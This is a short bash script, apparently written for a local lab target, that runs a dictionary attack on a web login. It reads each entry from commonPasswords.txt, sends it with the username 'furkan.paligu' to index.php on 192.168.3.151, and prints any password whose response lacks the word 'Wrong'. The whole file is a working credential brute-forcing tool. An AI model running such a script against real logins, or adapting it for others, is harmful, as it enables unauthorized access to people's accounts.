#! /bin/bash


while read -r line
do

   wrong=$(curl -s "192.168.3.151/index.php?username=furkan.paligu&password=$line" | grep  "Wrong")
   if  [[ -z $wrong ]];
   then
	echo "password is $line"
   fi
done < commonPasswords.txt
